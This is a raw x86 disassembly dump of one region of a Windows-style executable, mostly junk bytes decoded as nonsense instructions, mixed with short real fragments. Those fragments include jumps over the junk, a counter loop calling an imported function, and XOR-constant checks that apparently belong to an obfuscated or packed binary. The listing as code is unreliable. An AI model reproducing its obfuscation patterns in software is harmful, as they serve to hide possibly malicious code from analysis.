  40c030:	mov    ebp,0x822b08c6
  40c035:	xchg   esi,eax
  40c036:	test   eax,0x1bc85410
  40c03b:	sbb    DWORD PTR [esi-0x59e04f85],edi
  40c041:	sbb    al,0xf8
  40c043:	imul   esp,DWORD PTR [edx-0x3f257434],0xf
  40c04a:	or     DWORD PTR [edx+ebx*4-0x22],esp
  40c04e:	stos   DWORD PTR es:[edi],eax
  40c04f:	fwait
  40c050:	cmp    cx,0xac1
  40c055:	mov    WORD PTR ds:0xb0b74755,?
  40c05b:	mov    esp,0xf8a7cb73
  40c060:	xor    ah,BYTE PTR [edx]
  40c062:	xlat   BYTE PTR ds:[ebx]
  40c063:	mov    edi,0xa9240283
  40c068:	dec    ebp
  40c069:	push   ds
  40c06a:	call   0x930:0xd389a306
  40c071:	fbld   TBYTE PTR [edi]
  40c073:	fnsave [ebp-0x17]
  40c076:	call   0xa86dc55
  40c07b:	xchg   esp,eax
  40c07c:	or     ebx,ebp
  40c07e:	jbe    0x40c079
  40c080:	(bad)  
  40c081:	fdiv   QWORD PTR [esi-0x606ea695]
  40c087:	loopne 0x40c096
  40c089:	loopne 0x40c043
  40c08b:	vfmsubaddpd ymm2,ymm0,ymm1,YMMWORD PTR [esi]
  40c091:	stos   DWORD PTR es:[edi],eax
  40c092:	lods   al,BYTE PTR ds:[esi]
  40c093:	add    al,BYTE PTR fs:[edi+0x20480394]
  40c09a:	mov    eax,ds:0x4306c2
  40c09f:	or     eax,DWORD PTR ds:0x42ef8c
  40c0a5:	mov    ds:0x4306c2,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef9c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43061e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e8e2
  40c0cb:	mov    ds:0x43061e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x430626,0x0
  40c0dd:	mov    eax,ds:0x430626
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x430626,eax
  40c0e8:	cmp    DWORD PTR ds:0x430626,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x430632
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e8f6
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42ea73
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ec74
  40c11d:	cmp    DWORD PTR ds:0x430626,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	nop
  40c147:	adc    al,0x9a
  40c149:	xlat   BYTE PTR ds:[ebx]
  40c14a:	xor    bh,ch
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c125
  40c153:	mov    ebp,0x900306d8
  40c158:	jp     0x40c13f
  40c15a:	out    dx,eax
  40c15b:	jne    0x40c128
  40c15d:	add    dh,BYTE PTR [ecx]
  40c15f:	stc    
  40c160:	nop
  40c161:	out    0xbf,al
  40c163:	stc    
  40c164:	and    BYTE PTR [ecx-0x49],dl
  40c167:	scas   al,BYTE PTR es:[edi]
  40c168:	adc    ebp,DWORD PTR [edi+0x12]
  40c16b:	xor    DWORD PTR [edi+ebp*1],edi
  40c16e:	mov    ebx,edx
  40c170:	and    ebp,esi
  40c172:	test   al,0xa0
  40c174:	inc    esi
  40c175:	or     DWORD PTR [edx],ecx
  40c177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c178:	in     eax,dx
  40c179:	or     eax,0xe59cd91a
  40c17e:	iret   
  40c17f:	repnz inc edx
  40c181:	inc    ecx
  40c182:	std    
  40c183:	sub    al,0x3c
  40c185:	scas   al,BYTE PTR es:[edi]
  40c186:	sbb    edx,esp
  40c188:	inc    ecx
  40c189:	lahf   
  40c18a:	rcl    bh,cl
  40c18c:	pop    esp
  40c18d:	nop
  40c18e:	lods   al,BYTE PTR ds:[esi]
  40c18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c190:	cli    
  40c191:	out    0xfb,eax
  40c193:	int    0x0
  40c195:	mov    bl,0x75
  40c197:	fwait
  40c198:	shl    BYTE PTR [edi],1
  40c19a:	mov    eax,0xfedc25fd
  40c19f:	and    edx,edx
  40c1a1:	sub    ebx,edi
  40c1a3:	jne    0x40c1c0
  40c1a5:	sub    edi,DWORD PTR [ecx]
  40c1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1a8:	mov    dl,0x46
  40c1aa:	sub    ah,BYTE PTR [ebp+0x5f937053]
  40c1b0:	inc    dh
  40c1b2:	sbb    DWORD PTR [ebx+0x2936f1dd],edx
  40c1b8:	stos   BYTE PTR es:[edi],al
  40c1b9:	arpl   sp,bx
  40c1bb:	mov    esi,0x64a76857
  40c1c0:	shl    eax,0x3e
  40c1c3:	fidiv  WORD PTR [esi-0x27]
  40c1c6:	add    eax,DWORD PTR [eax+0x49]
  40c1c9:	jl     0x40c1d6
  40c1cb:	aaa    
  40c1cc:	test   BYTE PTR [ecx],dl
  40c1ce:	xor    esp,esi
  40c1d0:	sub    BYTE PTR ds:[eax+0x2e],dh
  40c1d4:	(bad)  
  40c1d5:	hlt    
  40c1d6:	sti    
  40c1d7:	out    0x69,eax
  40c1d9:	sti    
  40c1da:	or     DWORD PTR [esi-0x5704ed7f],esi
  40c1e0:	imul   eax,DWORD PTR [esi+0xf],0x4292fc8d
  40c1e7:	imul   edi,DWORD PTR [edx+0x4789678d],0x76
  40c1ee:	mov    eax,edi
  40c1f0:	bound  edi,QWORD PTR [edx]
  40c1f2:	mov    WORD PTR [eax-0xea63129],ss
  40c1f8:	inc    esp
  40c1f9:	mov    al,0x62
  40c1fb:	push   ebp
  40c1fc:	jne    0x40c20c
  40c1fe:	fidiv  DWORD PTR [ecx+0x474193a0]
  40c204:	mov    ecx,0x719fb650
  40c209:	xor    eax,0x3f99c139
  40c20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20f:	pusha  
  40c210:	stos   BYTE PTR es:[edi],al
  40c211:	(bad)  
  40c212:	jb     0x40c1c6
  40c214:	outs   dx,BYTE PTR ds:[esi]
  40c215:	pushf  
  40c216:	test   BYTE PTR [ecx-0x6a9a8d78],al
  40c21c:	sbb    ch,BYTE PTR [edx-0x4b]
  40c21f:	aad    0x6a
  40c221:	sahf   
  40c222:	ins    BYTE PTR es:[edi],dx
  40c223:	or     eax,0xe239d0d4
  40c228:	das    
  40c229:	mov    ebp,0x1c97df94
  40c22e:	jmp    0xa63b:0xa3bf2237
  40c235:	retf   
  40c236:	lods   al,BYTE PTR ds:[esi]
  40c237:	pop    edi
  40c238:	fwait
  40c239:	out    0xfc,eax
  40c23b:	int3   
  40c23c:	ins    BYTE PTR es:[edi],dx
  40c23d:	scas   eax,DWORD PTR es:[edi]
  40c23e:	mov    cl,dh
  40c240:	xchg   dh,al
  40c242:	jg     0x40c2ab
  40c244:	outs   dx,DWORD PTR ds:[esi]
  40c245:	mov    ebp,0xb6641920
  40c24a:	fldcw  WORD PTR [ecx]
  40c24c:	das    
  40c24d:	or     al,0x7a
  40c24f:	jl     0x40c277
  40c251:	stos   BYTE PTR es:[edi],al
  40c252:	fdivr  st(0),st
  40c254:	and    eax,0xea616f54
  40c259:	fcom   QWORD PTR [esi+0x498d939f]
  40c25f:	push   edx
  40c260:	aad    0xac
  40c262:	neg    DWORD PTR [ecx+0x34]
  40c265:	dec    ebx
  40c266:	and    ebx,edi
  40c268:	xor    cl,BYTE PTR [ebx+eiz*8]
  40c26b:	fimul  WORD PTR [esi+0x7f]
  40c26e:	dec    ecx
  40c26f:	cmp    al,0x90
  40c271:	data16 je 0x40c229
  40c274:	push   edi
  40c275:	xchg   BYTE PTR [edx],al
  40c277:	inc    eax
  40c278:	outs   dx,DWORD PTR ds:[esi]
  40c279:	ds jecxz 0x40c23f
  40c27c:	mov    cs,WORD PTR [edi]
  40c27e:	mov    ch,0xd1
  40c280:	pusha  
  40c281:	clc    
  40c282:	mov    cs,esp
  40c284:	mov    ds:0x583becb3,eax
  40c289:	dec    ebx
  40c28a:	jae    0x40c22d
  40c28c:	pusha  
  40c28d:	or     al,0x3d
  40c28f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c291:	std    
  40c292:	clc    
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x5ce92bcc,0xf315d3ce
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2fe
  40c2bd:	pop    esp
  40c2be:	push   esi
  40c2bf:	clc    
  40c2c0:	mov    ds:0x5deeea61,al
  40c2c5:	ins    DWORD PTR es:[edi],dx
  40c2c6:	daa    
  40c2c7:	xor    DWORD PTR [edx],edx
  40c2c9:	sbb    al,0xdf
  40c2cb:	pushf  
  40c2cc:	int3   
  40c2cd:	pusha  
  40c2ce:	arpl   WORD PTR [eax],si
  40c2d0:	addr16 cmp esi,esp
  40c2d3:	nop
  40c2d4:	xchg   ebp,eax
  40c2d5:	cli    
  40c2d6:	jno    0x40c2c4
  40c2d8:	push   edx
  40c2d9:	ins    DWORD PTR es:[edi],dx
  40c2da:	ret    
  40c2db:	outs   dx,BYTE PTR ds:[esi]
  40c2dc:	inc    BYTE PTR [edi]
  40c2de:	add    BYTE PTR [ecx+0x2a624076],0xe4
  40c2e5:	dec    ebp
  40c2e6:	push   ebx
  40c2e7:	cmp    DWORD PTR [ecx],ebx
  40c2e9:	mov    ch,0x69
  40c2eb:	inc    eax
  40c2ec:	inc    esi
  40c2ed:	test   BYTE PTR [ecx],dh
  40c2ef:	push   ebp
  40c2f0:	fdivrp st(3),st
  40c2f2:	mov    edi,0x959fe6c8
  40c2f7:	dec    edx
  40c2f8:	pop    es
  40c2f9:	sub    eax,0x36050a3a
  40c2fe:	adc    ah,BYTE PTR [edi+0x22d86ecb]
  40c304:	js     0x40c344
  40c306:	enter  0x9eb,0xa2
  40c30a:	(bad)  
  40c30b:	fdiv   st,st(0)
  40c30d:	outs   dx,BYTE PTR ds:[esi]
  40c30e:	xchg   ecx,eax
  40c30f:	sub    al,0x6d
  40c311:	test   BYTE PTR [esi+0x1a4a1526],cl
  40c317:	mov    ch,0x11
  40c319:	jle    0x40c2ed
  40c31b:	out    0xf5,eax
  40c31d:	inc    eax
  40c31e:	adc    bh,BYTE PTR [esi-0x1f]
  40c321:	cs xchg ecx,eax
  40c323:	loopne 0x40c314
  40c325:	pusha  
  40c326:	out    0x3,al
  40c328:	mov    ?,edi
  40c32a:	push   esp
  40c32b:	mov    bh,0x5a
  40c32d:	sahf   
  40c32e:	iret   
  40c32f:	sub    eax,0x9eab70a7
  40c334:	xor    DWORD PTR [ebp-0x7afde634],edi
  40c33a:	(bad)  
  40c33b:	xchg   edx,eax
  40c33c:	mov    bh,0xf3
  40c33e:	retf   0xc1b4
  40c341:	stos   DWORD PTR es:[edi],eax
  40c342:	jecxz  0x40c3b8
  40c344:	leave  
  40c345:	and    BYTE PTR [edx+0x6f],dh
  40c348:	push   0xdd5816d1
  40c34d:	sub    cl,BYTE PTR ds:0xd0e39381
  40c353:	ins    BYTE PTR es:[edi],dx
  40c354:	adc    al,dh
  40c356:	push   esp
  40c357:	fdivr  DWORD PTR ds:0x9c0d585a
  40c35d:	add    bh,BYTE PTR [esi-0x40]
  40c360:	out    0x2b,eax
  40c362:	sbb    al,BYTE PTR [esi]
  40c364:	mov    dh,0xdf
  40c366:	jg     0x40c360
  40c368:	jp     0x40c341
  40c36a:	xlat   BYTE PTR ds:[ebx]
  40c36b:	mov    ch,0x27
  40c36d:	mov    ebx,0xf1188cbd
  40c372:	jbe    0x40c3eb
  40c374:	sbb    DWORD PTR [ebp+0x67],esi
  40c377:	jmp    0xae5a7364
  40c37c:	cld    
  40c37d:	and    al,0xc
  40c37f:	jns    0x40c379
  40c381:	and    al,0xa4
  40c383:	pop    ebx
  40c384:	jno    0x40c3a3
  40c386:	xchg   esp,eax
  40c387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c388:	lods   al,BYTE PTR ds:[esi]
  40c389:	lods   eax,DWORD PTR ds:[esi]
  40c38a:	sahf   
  40c38b:	push   0x9a51bfb6
  40c390:	pop    ds
  40c391:	xor    DWORD PTR [edi+0x15532caa],edi
  40c397:	data16 xlat BYTE PTR ds:[ebx]
  40c399:	icebp  
  40c39a:	addr16 out 0x62,eax
  40c39d:	push   cs
  40c39e:	loopne 0x40c3fb
  40c3a0:	inc    edi
  40c3a1:	sbb    cl,cl
  40c3a3:	enter  0xd4e5,0x5
  40c3a7:	test   BYTE PTR [esi-0x23],ch
  40c3aa:	xchg   edi,eax
  40c3ab:	jo     0x40c39b
  40c3ad:	inc    esi
  40c3ae:	sub    eax,0x1d2a84db
  40c3b3:	scas   al,BYTE PTR es:[edi]
  40c3b4:	add    eax,0x853fa5cc
  40c3b9:	cmp    DWORD PTR [edi+0x7b9e00d],ebx
  40c3bf:	pushf  
  40c3c0:	fimul  WORD PTR [edi+0x25]
  40c3c3:	enter  0xff1d,0xe6
  40c3c7:	adc    bl,BYTE PTR [ebp-0x1a3941d0]
  40c3cd:	mov    dh,bh
  40c3cf:	in     eax,dx
  40c3d0:	mov    al,0x5d
  40c3d2:	dec    ebx
  40c3d3:	dec    esi
  40c3d4:	pop    esi
  40c3d5:	and    al,0x15
  40c3d7:	outs   dx,BYTE PTR ds:[esi]
  40c3d8:	and    BYTE PTR [edx+0x329c0e2c],bl
  40c3de:	mov    bl,0xf
  40c3e0:	lahf   
  40c3e1:	mul    DWORD PTR [edi]
  40c3e3:	xor    al,0xbb
  40c3e5:	and    dh,ch
  40c3e7:	hlt    
  40c3e8:	mov    edx,edx
  40c3ea:	and    BYTE PTR [ebp-0x12],ch
  40c3ed:	or     al,0x3f
  40c3ef:	mov    dl,ah
  40c3f1:	cld    
  40c3f2:	sahf   
  40c3f3:	push   cs
  40c3f4:	dec    edi
  40c3f5:	sub    al,0xc0
  40c3f7:	daa    
  40c3f8:	xlat   BYTE PTR ds:[ebx]
  40c3f9:	imul   esp,DWORD PTR ds:0x458d1b33,0x159e9f8
  40c403:	add    BYTE PTR [eax],al
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	cmp    edx,DWORD PTR [edx]
  40c413:	jmp    0x7f407843
  40c418:	jle    0x40c459
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c451
  40c41e:	les    eax,FWORD PTR [ebx-0x19317675]
  40c424:	fisubr DWORD PTR [edx-0x1f]
  40c427:	and    eax,0x99d99c7
  40c42c:	aam    0x56
  40c42e:	repz mov ebx,0x7a68300d
  40c434:	pop    ebp
  40c435:	lahf   
  40c436:	dec    edi
  40c437:	test   BYTE PTR [esi+0x14a650d0],dl
  40c43d:	repnz (bad) 
  40c43f:	jg     0x40c3d8
  40c441:	mov    eax,ds:0x7aed5e88
  40c446:	cmp    edx,ecx
  40c448:	mov    eax,ds:0x272c5cfd
  40c44d:	ret    
  40c44e:	les    ecx,FWORD PTR ds:0x89bcf4b8
  40c454:	jecxz  0x40c41d
  40c456:	push   ecx
  40c457:	test   DWORD PTR [edi-0x672e8010],ebp
  40c45d:	and    ecx,DWORD PTR [ecx+0x6c1c5d3a]
  40c463:	jg     0x40c4b9
  40c465:	pop    esp
  40c466:	jbe    0x40c437
  40c468:	out    0xa8,eax
  40c46a:	and    al,0xd7
  40c46c:	xlat   BYTE PTR ds:[ebx]
  40c46d:	lahf   
  40c46e:	(bad)  
  40c46f:	mov    ebx,0xba8dd949
  40c474:	dec    ebp
  40c475:	je     0x40c44d
  40c477:	fcmovne st,st(5)
  40c479:	jns    0x40c437
  40c47b:	cmp    al,0x64
  40c47d:	inc    edx
  40c47e:	jg     0x40c4df
  40c480:	pushf  
  40c481:	xchg   edx,eax
  40c482:	jmp    0x40c4a7
  40c484:	sbb    dh,ah
  40c486:	jle    0x40c428
  40c488:	cli    
  40c489:	jae    0x40c455
  40c48b:	cs loop 0x40c40e
  40c48e:	mov    al,BYTE PTR [ecx+0x30]
  40c491:	cmp    ebp,edx
  40c493:	popa   
  40c494:	pop    ds
  40c495:	or     DWORD PTR [eax+0xb4f2f9d],eax
  40c49b:	adc    DWORD PTR [edi],esp
  40c49d:	or     edx,DWORD PTR [edi+ecx*8+0x52e5780e]
  40c4a4:	xor    cl,BYTE PTR [ebx-0x70]
  40c4a7:	mov    ss,WORD PTR [ebp-0x33]
  40c4aa:	cs and eax,ebx
  40c4ad:	jne    0x40c42f
  40c4af:	(bad)  
  40c4b0:	lds    edx,FWORD PTR [edi]
  40c4b2:	push   es
  40c4b3:	adc    al,0xe2
  40c4b5:	jle    0x40c4e5
  40c4b7:	ds jp  0x40c487
  40c4ba:	(bad)  
  40c4bb:	mov    ds:0xc986e0c7,al
  40c4c0:	pop    edi
  40c4c1:	test   al,0xdc
  40c4c3:	cs in  eax,0x4b
  40c4c6:	nop
  40c4c7:	jg     0x40c4bf
  40c4c9:	adc    ebp,ebp
  40c4cb:	fdiv   DWORD PTR es:[ebp+0x59eebf89]
  40c4d2:	neg    DWORD PTR [edx]
  40c4d4:	or     al,0xa1
  40c4d6:	mov    cl,0xda
  40c4d8:	sar    bl,1
  40c4da:	inc    ebx
  40c4db:	push   ebx
  40c4dc:	fidiv  WORD PTR ds:0xf4a8637b
  40c4e2:	scas   al,BYTE PTR es:[edi]
  40c4e3:	inc    ebx
  40c4e4:	out    0xd6,eax
  40c4e6:	adc    dh,BYTE PTR [edx-0x66e8f271]
  40c4ec:	cdq    
  40c4ed:	add    esp,esp
  40c4ef:	mov    eax,ds:0xce3c3ae8
  40c4f4:	mov    bl,BYTE PTR [edi]
  40c4f6:	cli    
  40c4f7:	dec    ebp
  40c4f8:	in     al,0x6e
  40c4fa:	lods   eax,DWORD PTR ds:[esi]
  40c4fb:	data16 or BYTE PTR [ebx],0x1e
  40c4ff:	(bad)  
  40c501:	or     dl,dl
  40c503:	test   DWORD PTR [bx+0x2f],0x86d8c6c8
  40c50b:	jmp    0x40c51c
  40c50d:	and    BYTE PTR [esi-0x69499623],cl
  40c513:	mov    ebx,?
  40c515:	pop    esi
  40c516:	xchg   esp,eax
  40c517:	imul   esp,DWORD PTR [ecx+ebx*4+0x1464a6c0],0x7
  40c51f:	xor    ch,0xaa
  40c522:	iret   
  40c523:	mov    ecx,0x32836a39
  40c528:	push   ds
  40c529:	test   DWORD PTR [eax-0x5],edi
  40c52c:	adc    eax,0x133c4eff
  40c531:	mov    BYTE PTR [esi+edi*4],bl
  40c534:	cmp    al,0x89
  40c536:	repnz push cs
  40c538:	enter  0xb858,0x2e
  40c53c:	push   ebx
  40c53d:	sbb    ch,bh
  40c53f:	mov    ch,0x55
  40c541:	cmp    BYTE PTR [ecx],0x31
  40c544:	cmp    eax,0xf4c6d9fb
  40c549:	sbb    eax,DWORD PTR [edx-0x5a3387e9]
  40c54f:	push   esp
  40c550:	(bad)  
  40c551:	sahf   
  40c552:	les    edi,FWORD PTR [ebx-0x33]
  40c555:	into   
  40c556:	or     DWORD PTR [edx-0x1701be3],ebx
  40c55c:	mov    esi,0xd04d8920
  40c561:	push   eax
  40c562:	push   DWORD PTR [ebp-0x30]
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x88771933
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5be
  40c58e:	mov    eax,0x8aa66a85
  40c593:	push   esi
  40c594:	sbb    al,0xf8
  40c596:	adc    eax,0xe9e664da
  40c59b:	clc    
  40c59c:	add    BYTE PTR [edx+0x53],dl
  40c59f:	cmp    DWORD PTR [esi+ebp*4-0x1b],edi
  40c5a3:	xlat   BYTE PTR ds:[ebx]
  40c5a4:	or     cl,BYTE PTR [eax]
  40c5a6:	sbb    edx,DWORD PTR [edi+ebx*4]
  40c5a9:	and    ch,BYTE PTR [eax+0x432c2fe2]
  40c5af:	add    BYTE PTR [ebp+0x59],dl
  40c5b2:	cs mov cl,0x25
  40c5b5:	push   ecx
  40c5b6:	loopne 0x40c5f0
  40c5b8:	sti    
  40c5b9:	jb     0x40c5af
  40c5bb:	sahf   
  40c5bc:	cld    
  40c5bd:	dec    edi
  40c5be:	cli    
  40c5bf:	jns    0x40c623
  40c5c1:	std    
  40c5c2:	repz into 
  40c5c4:	pop    ss
  40c5c5:	stos   DWORD PTR es:[edi],eax
  40c5c6:	retf   
  40c5c7:	xor    eax,0x264606e3
  40c5cc:	ds stos BYTE PTR es:[edi],al
  40c5ce:	xchg   ebp,eax
  40c5cf:	lods   al,BYTE PTR ds:[esi]
  40c5d0:	mov    DWORD PTR [eax],ebx
  40c5d2:	dec    edx
  40c5d3:	cmp    eax,0xbdc6de4
  40c5d8:	sub    al,0xfa
  40c5da:	adc    ah,BYTE PTR [ebx+edx*4-0x8]
  40c5de:	ins    BYTE PTR es:[edi],dx
  40c5df:	sbb    al,0xdd
  40c5e1:	or     eax,0x15126cf0
  40c5e6:	mov    ecx,0x505c81a8
  40c5eb:	ret    
  40c5ec:	popf   
  40c5ed:	in     al,0x29
  40c5ef:	dec    ebp
  40c5f0:	sbb    al,0x4c
  40c5f2:	imul   ecx,ecx,0xffffff81
  40c5f5:	inc    ecx
  40c5f6:	in     al,dx
  40c5f7:	sbb    al,0x55
  40c5f9:	scas   eax,DWORD PTR es:[edi]
  40c5fa:	and    al,BYTE PTR [ebx+0x3a]
  40c5fd:	idiv   BYTE PTR ds:0x3061d6c1
  40c603:	mov    ebp,0x9de3fc60
  40c608:	mov    eax,0x6813bc03
  40c60d:	dec    esp
  40c60e:	sti    
  40c60f:	in     al,dx
  40c610:	scas   al,BYTE PTR es:[edi]
  40c611:	ja     0x40c5bc
  40c613:	ins    DWORD PTR es:[edi],dx
  40c614:	mov    al,0x14
  40c616:	xchg   ebx,eax
  40c617:	popa   
  40c618:	jmp    0xa2b1b806
  40c61d:	cld    
  40c61e:	or     BYTE PTR [eax+0x22],0xfc
  40c622:	scas   al,BYTE PTR es:[edi]
  40c623:	dec    bp
  40c625:	jno    0x40c649
  40c627:	(bad)  
  40c628:	fsub   QWORD PTR [eax+ecx*1]
  40c62b:	mov    ebx,0x877aa3a7
  40c630:	mov    cs,WORD PTR [edi]
  40c632:	in     eax,0xfe
  40c634:	data16 (bad) 
  40c637:	xchg   ebp,eax
  40c638:	xor    ah,0xea
  40c63b:	in     eax,dx
  40c63c:	push   ebx
  40c63d:	pop    ds
  40c63e:	gs jge 0x40c612
  40c641:	sbb    DWORD PTR [ebp+0x6c2ae70b],ebx
  40c647:	and    eax,0x97886284
  40c64c:	mov    ds:0xa712443a,eax
  40c651:	retf   
  40c652:	stos   BYTE PTR es:[edi],al
  40c653:	and    BYTE PTR [eax+0x78],bl
  40c656:	jmp    0xbf1:0x8596d904
  40c65d:	xor    eax,0xdff6b885
  40c662:	sti    
  40c663:	jae    0x40c6d0
  40c665:	sbb    BYTE PTR [edi],dl
  40c667:	and    esp,DWORD PTR [ecx+0xac31dbc]
  40c66d:	adc    al,0x2f
  40c66f:	jb     0x40c5f3
  40c671:	mov    al,ds:0x77e1a4e3
  40c676:	mov    edx,0x12afa186
  40c67b:	mov    bl,0x2d
  40c67d:	mov    edx,ecx
  40c67f:	jg     0x40c680
  40c681:	and    edi,DWORD PTR [ecx+0x376fca05]
  40c687:	call   0x40d6:0xda398673
  40c68e:	dec    edx
  40c68f:	pop    ecx
  40c690:	fstp   DWORD PTR [ebp+0x2c]
  40c693:	cld    
  40c694:	stos   DWORD PTR es:[edi],eax
  40c695:	mul    DWORD PTR [esi+0x64]
  40c698:	xchg   BYTE PTR [ecx+ebx*1+0x36],cl
  40c69c:	aaa    
  40c69d:	xchg   DWORD PTR [ebx],eax
  40c69f:	mov    DWORD PTR [ebp+0x86e998d],ecx
  40c6a5:	ja     0x40c6a3
  40c6a7:	in     al,0xf4
  40c6a9:	cmp    al,0xe2
  40c6ab:	jle    0x40c673
  40c6ad:	es inc ebp
  40c6af:	out    dx,eax
  40c6b0:	adc    bl,BYTE PTR [edi+0x29e59cf6]
  40c6b6:	add    eax,0xc5025aca
  40c6bb:	push   ebp
  40c6bc:	sbb    ah,BYTE PTR [ebx]
  40c6be:	sbb    DWORD PTR [eax+0x1c],ecx
  40c6c1:	pop    esp
  40c6c2:	rol    DWORD PTR [esi-0x19],1
  40c6c5:	jns    0x40c656
  40c6c7:	retf   
  40c6c8:	out    0x6b,al
  40c6ca:	retf   0x8009
  40c6cd:	mov    ecx,DWORD PTR es:[ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	jns    0x40c700
  40c742:	cli    
  40c743:	dec    ebp
  40c744:	ss bnd jle 0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c7b6
  40c74d:	retf   0xd756
  40c750:	or     cl,BYTE PTR [esi+0x33]
  40c753:	or     al,0x99
  40c755:	pusha  
  40c756:	sub    BYTE PTR [ecx+0x11d1657b],cl
  40c75c:	sbb    BYTE PTR [edx-0x25],ah
  40c75f:	push   ebx
  40c760:	ret    
  40c761:	(bad)  
  40c762:	cmp    al,0x2a
  40c764:	cs xchg ebp,eax
  40c766:	nop
  40c767:	and    BYTE PTR [eax-0x16],dh
  40c76a:	stos   DWORD PTR es:[edi],eax
  40c76b:	scas   al,BYTE PTR es:[edi]
  40c76c:	js     0x40c6fe
  40c76e:	clc    
  40c76f:	test   eax,0xeb2b5537
  40c774:	icebp  
  40c775:	xor    eax,0xd6c70b02
  40c77a:	sub    dl,BYTE PTR [edx+esi*2+0x53]
  40c77e:	cmp    DWORD PTR [ecx+esi*1],edx
  40c781:	mov    esi,0xd8865c77
  40c786:	js     0x40c76f
  40c788:	test   BYTE PTR [edx+0x52],cl
  40c78b:	inc    ebp
  40c78c:	aam    0xe6
  40c78e:	xchg   edx,eax
  40c78f:	mov    ebp,0x3aad555c
  40c794:	lods   al,BYTE PTR ds:[esi]
  40c795:	sbb    eax,ebp
  40c797:	jge    0x40c79d
  40c799:	jbe    0x40c7d8
  40c79b:	test   BYTE PTR [esi-0x4d5d65bb],dh
  40c7a1:	mov    edi,0x5267bfdf
  40c7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7a7:	inc    ecx
  40c7a8:	imul   ebx,DWORD PTR [esi],0xffffffd5
  40c7ab:	sub    ecx,esi
  40c7ad:	iret   
  40c7ae:	es push esp
  40c7b0:	xchg   esi,eax
  40c7b1:	sbb    ecx,DWORD PTR [edx]
  40c7b3:	icebp  
  40c7b4:	xor    eax,DWORD PTR [eax]
  40c7b6:	push   esp
  40c7b7:	inc    edi
  40c7b8:	mov    al,0xc5
  40c7ba:	sahf   
